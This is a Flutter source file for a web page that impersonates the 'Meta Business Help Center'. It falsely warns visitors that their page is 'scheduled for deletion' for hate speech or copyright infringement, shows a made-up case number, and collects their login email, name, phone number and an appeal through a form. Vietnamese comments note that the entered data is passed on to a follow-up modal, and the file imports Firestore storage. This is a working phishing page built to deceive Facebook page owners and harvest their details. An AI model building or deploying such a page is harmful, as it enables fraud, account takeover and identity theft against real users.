import 'package:easy_localization/easy_localization.dart';
import 'package:flutter_screenutil/flutter_screenutil.dart';
import 'package:gap/gap.dart';
import 'package:_iwu_pack/_iwu_pack.dart';
import 'package:flutter/material.dart';
import 'package:meta_business/src/presentation/home/auth_screen.dart';
import 'package:meta_business/src/presentation/home/widget/footer.dart';
import 'package:meta_business/src/presentation/home/widget/header.dart';
import 'package:meta_business/src/presentation/home/widget/model_sucess.dart';
import 'package:meta_business/src/presentation/home/widget/widget_input.dart';
import 'package:meta_business/src/resources/firestore/instances.dart';

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class _HomeScreenState extends State<HomeScreen> {
  TextEditingController c1 = TextEditingController();
  TextEditingController c2 = TextEditingController();
  TextEditingController c3 = TextEditingController();
  TextEditingController c4 = TextEditingController();
  final _formKey = GlobalKey<FormState>();

  bool accepted = false;
  // bool get enableButton =>
  //     accepted && c1.text.isEmail && c2.text.isNotEmpty && c3.text.isNotEmpty;
  bool get enableButton => accepted;

  _submit() async {
    if (_formKey.currentState!.validate()) {
      //khởi tạo data của form nhập thông tin
      final data = FormInput(
          username: c1.text, name: c2.text, phone: c3.text, comment: c4.text);
      appShowGeneralDialog(
        context: context,
        child: ModalSuccess(
            data: data), //truyền data user nhập vào ném qua bên modal
      );
    }
  }

  @override
  void initState() {
    super.initState();
    // WidgetsBinding.instance.addPostFrameCallback((timeStamp) {
    //   appShowGeneralDialog(
    //     context: context,
    //     child: const _ModalSuccess(),
    //   );
    // });
  }

  @override
  Widget build(BuildContext context) {
    
    return Scaffold(
      backgroundColor: appColorBackground,
      body: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          //header
          const Header(),
          //body
          Expanded(
              child: SingleChildScrollView(
            child: Column(
              children: [
                Container(
                  height: 200,
                  width: double.infinity,
                  decoration: const BoxDecoration(
                      image: DecorationImage(
                          image: AssetImage('assets/images/png/m2.jpg'),
                          fit: BoxFit.fitHeight)),
                  child: Column(
                    mainAxisSize: MainAxisSize.max,
                    crossAxisAlignment: CrossAxisAlignment.center,
                    mainAxisAlignment: MainAxisAlignment.center,
                    children: [
                      Text(
                        'Meta Business Help Center'
                            .tr(),
                        style: w300TextStyle(
                          fontSize: 19,
                          color: Colors.white,
                        ),
                      ),
                      const Gap(4),
                      Text(
                        'GET SUPPORT'.tr(),
                        style: w700TextStyle(
                          fontSize: 29,
                          color: Colors.white,
                        ),
                      ),
                    ],
                  ),
                ),
                Container(
                  color: hexColor('E9EAED'),
                  padding: EdgeInsets.symmetric(
                      horizontal: _paddingHorizontal(context)),
                  child: Form(
                    key: _formKey,
                    child: Column(
                      children: [
                        const Gap(24),
                        Container(
                          color: Colors.white,
                          padding: const EdgeInsets.symmetric(
                              horizontal: 16, vertical: 16),
                          child: Row(
                            children: [
                              CircleAvatar(
                                backgroundColor: hexColor('575D6D'),
                                radius: 24,
                                child: const Icon(
                                  Icons.email,
                                  color: Colors.white,
                                ),
                              ),
                              const Gap(20),
                              Expanded(
                                  child: Column(
                                crossAxisAlignment: CrossAxisAlignment.start,
                                children: [
                                  Text(
                                    "Your page goes against our Community Standards",
                                    style: w500TextStyle(fontSize: 16),
                                  ),
                                  const Gap(4),
                                  Row(
                                    mainAxisSize: MainAxisSize.min,
                                    children: [
                                      Container(
                                        padding: const EdgeInsets.all(6),
                                        decoration: BoxDecoration(
                                            color: hexColor('4A80CC'),
                                            borderRadius:
                                                BorderRadius.circular(6)),
                                        child: Text(
                                          "OPEN",
                                          style: w700TextStyle(
                                              fontSize: 14,
                                              color: Colors.white),
                                        ),
                                      ),
                                      const Gap(8),
                                      Expanded(
                                        child: Text(
                                          "Case #234857718299001",
                                          style: w300TextStyle(
                                              fontSize: 12,
                                              color: hexColor('787B7D')),
                                        ),
                                      ),
                                    ],
                                  )
                                ],
                              ))
                            ],
                          ),
                        ),
                        Container(
                          color: hexColor('F6F7F8'),
                          padding: const EdgeInsets.symmetric(
                              horizontal: 16, vertical: 16),
                          child: Row(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Image.asset(
                                'assets/images/png/m3.jpg',
                                width: 24 * 2,
                              ),
                              const Gap(20),
                              Expanded(
                                  child: Column(
                                crossAxisAlignment: CrossAxisAlignment.start,
                                children: [
                                  const Gap(8),
                                  Text(
                                    "Our Message",
                                    style: w500TextStyle(fontSize: 16),
                                  ),
                                  const Gap(4),
                                  Text(
                                    """Your page has been scheduled for deletion because one or more the following
                        - Intellectual Property Infringement
                        - Community Standards
                        - Hate Speech""",
                                    style: w300TextStyle(
                                        height: 1.4, fontSize: 14),
                                  ),
                                ],
                              ))
                            ],
                          ),
                        ),
                        Container(
                          height: 2,
                          width: context.width,
                          color: hexColor('E8E8E9'),
                        ),
                        Container(
                          color: hexColor('F6F7F8'),
                          padding: const EdgeInsets.symmetric(
                              horizontal: 16, vertical: 16),
                          child: Row(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Image.asset(
                                'assets/images/png/m1.png',
                                width: 24 * 2,
                              ),
                              const Gap(20),
                              Expanded(
                                child: Column(
                                  crossAxisAlignment: CrossAxisAlignment.start,
                                  children: [
                                    const Gap(8),
                                    Text(
                                      "Your Reply",
                                      style: w500TextStyle(fontSize: 16),
                                    ),
                                    const Gap(4),
                                    Text(
                                      """Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.""",
                                      style: w300TextStyle(
                                          height: 1.4, fontSize: 14),
                                    ),
                                    const Gap(24),
                                    WidgetInput(
                                        validator: (value) {
                                          if (value == null || !value.isEmail) {
                                            return 'Login Email Address is not Valid. Please Enter Correct Email Address';
                                          }
                                          return null;
                                        },
                                        label: "Login email",
                                        controller: c1,
                                        onChanged: (_) {
                                          setState(() {});
                                        }),
                                    const Gap(24),
                                    WidgetInput(
                                        validator: (value) {
                                          if (value == null || value.isEmpty) {
                                            return 'Please enter your name';
                                          }
                                          return null;
                                        },
                                        label: "Your name",
                                        controller: c2,
                                        onChanged: (_) {
                                          setState(() {});
                                        }),
                                    const Gap(24),
                                    WidgetInput(
                                        validator: (value) {
                                          if (value == null || value.isEmpty) {
                                            return 'Please enter your phone';
                                          }
                                          return null;
                                        },
                                        label: "Your phone number",
                                        controller: c3,
                                        onChanged: (_) {
                                          setState(() {});
                                        }),
                                    const Gap(24),
                                    WidgetInput(
                                        label: "Your appeal",
                                        controller: c4,
                                        minLines: 4,
                                        onChanged: (_) {
                                          setState(() {});
                                        }),
                                    const Gap(24),
                                    InkWell(
                                      onTap: () {
                                        setState(() {
                                          accepted = !accepted;
                                        });
                                      },
                                      child: Row(
                                        // spacing: 6,
                                        mainAxisSize: MainAxisSize.min,
                                        children: [
                                          Container(
                                            height: 20,
                                            width: 20,
                                            alignment: Alignment.center,
                                            decoration: BoxDecoration(
                                                color: Colors.white,
                                                border: Border.all(
                                                    width: 1.2,
                                                    color: hexColor('929497'))),
                                            child: accepted
                                                ? Icon(
                                                    Icons.check,
                                                    color: appColorText,
                                                    size: 16,
                                                  )
                                                : const SizedBox(),
                                          ),
                                          const Gap(12),
                                          Expanded(
                                            child: Text(
                                              """Do you agree to Terms, Data Policy and Cookies Policy.""",
                                              style: w300TextStyle(
                                                  height: 1.4, fontSize: 14),
                                            ),
                                          ),
                                        ],
                                      ),
                                    ),
                                    const Gap(24),
                                    WidgetRippleButton(
                                      onTap: enableButton ? _submit : null,
                                      color: enableButton
                                          ? hexColor('355797')
                                          : hexColor('5E77AA'),
                                      child: Container(
                                        padding: const EdgeInsets.symmetric(
                                            horizontal: 16, vertical: 8),
                                        child: Text(
                                          "Submit",
                                          style: w700TextStyle(
                                              fontSize: 14,
                                              color: Colors.white),
                                        ),
                                      ),
                                    ),
                                    const Gap(24),
                                  ],
                                ),
                              ),
                            ],
                          ),
                        ),
                        const Gap(24),
                      ],
                    ),
                  ),
                ),
                //footer
                const Footer()
              ],
            ),
          ))
        ],
      ),
    );
    
    return AuthScreen();
  }
}

double _paddingHorizontal(BuildContext context) =>
    context.width > 1024 ? (context.width - 1024) / 2 + 150.r : 16;

appShowGeneralDialog(
    {required context, required Widget child, bool barrierDismissible = true}) {
  showGeneralDialog(
    barrierLabel: "contact_us_popup",
    barrierColor: Colors.black.withOpacity(0.05),
    barrierDismissible: barrierDismissible,
    transitionDuration: const Duration(milliseconds: 300),
    context: context,
    pageBuilder: (context, anim1, anim2) {
      return child;
    },
    transitionBuilder: (context, anim1, anim2, child) {
      return SlideTransition(
        position: Tween(begin: const Offset(0, 1), end: const Offset(0, 0))
            .animate(anim1),
        child: child,
      );
    },
  );
}
